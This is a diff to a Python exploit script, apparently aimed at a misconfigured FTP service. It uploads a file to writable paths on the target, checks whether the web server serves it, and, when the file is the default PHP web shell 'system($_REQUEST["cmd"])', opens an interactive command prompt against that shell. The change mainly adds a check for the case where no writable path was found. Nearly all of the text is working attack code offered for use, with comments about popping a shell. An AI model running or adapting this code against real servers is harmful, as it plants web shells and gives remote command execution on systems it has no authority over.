@@ -376,41 +376,45 @@ if __name__ == '__main__':
         if (found and STOP_ON_FIRST):
             vlog('STOP_ON_FIRST is enabled and a path was found, stopping...')
             break
+    
+    # tell the user if we didn't find anything
+    if len(targets) == 0:
+        wlog('Either the vulnerability is unexploitable or we were unable to find a writable path')
+    else:
+        # now upload to each path we found
+        for path in targets:
+            basename = FILENAME
+            filename = strip_slashes(path + '/' + basename)
 
-    # now upload to each path we found
-    for path in targets:
-        basename = FILENAME
-        filename = strip_slashes(path + '/' + basename)
+            dlog('Uploading %s to %s ...' % (basename, filename))
 
-        dlog('Uploading %s to %s ...' % (basename, filename))
+            if not STOR(sock, filename, FILE_CONTENT):
+                wlog('Failed to upload file to %s' % filename)
+            else:
+                ilog('File uploaded to %s' % filename)
 
-        if not STOR(sock, filename, FILE_CONTENT):
-            wlog('Failed to upload file to %s' % filename)
-        else:
-            ilog('File uploaded to %s' % filename)
+        # check the webserver to see if the file is accessible
+        if CHECK_FILE:
+            url = 'http://%s/%s' % (RHOST, FILENAME)
 
-    # check the webserver to see if the file is accessible
-    if CHECK_FILE:
-        url = 'http://%s/%s' % (RHOST, FILENAME)
+            found = False
 
-        found = False
-
-        try:
-            urllib.request.urlopen(url, timeout = 5).read().decode('utf-8', errors = 'ignore')
-
-            found = True
-            ilog('Hooray, your file was found at %s ...have fun!' % url)
-        except:
-            wlog('The file %s could not be found on the webserver, you will have to manually look for it' % FILENAME)
-
-        # if the user is super lazy and didn't even bother to configure, let's just pop a nice shell
-        if found and (FILENAME == 'shell.php' and FILE_CONTENT.strip() == '<?php system($_REQUEST["cmd"]); ?>'):
             try:
-                while True:
-                    cmd = urllib.parse.urlencode({'cmd' : input('$ ')})
-                    print(urllib.request.urlopen(url + '?' + cmd, timeout = 5).read().decode('utf-8', errors = 'ignore')[:-1])
-            except (KeyboardInterrupt, EOFError) as e:
-                pass
+                urllib.request.urlopen(url, timeout = 5).read().decode('utf-8', errors = 'ignore')
+
+                found = True
+                ilog('Hooray, your file was found at %s ...have fun!' % url)
+            except:
+                wlog('The file %s could not be found on the webserver, you will have to manually look for it' % FILENAME)
+
+            # if the user is super lazy and didn't even bother to configure, let's just pop a nice shell
+            if found and (FILENAME == 'shell.php' and FILE_CONTENT.strip() == '<?php system($_REQUEST["cmd"]); ?>'):
+                try:
+                    while True:
+                        cmd = urllib.parse.urlencode({'cmd' : input('$ ')})
+                        print(urllib.request.urlopen(url + '?' + cmd, timeout = 5).read().decode('utf-8', errors = 'ignore')[:-1])
+                except (KeyboardInterrupt, EOFError) as e:
+                    pass
 
     dlog('Script finished, goodbye!')
     exit()
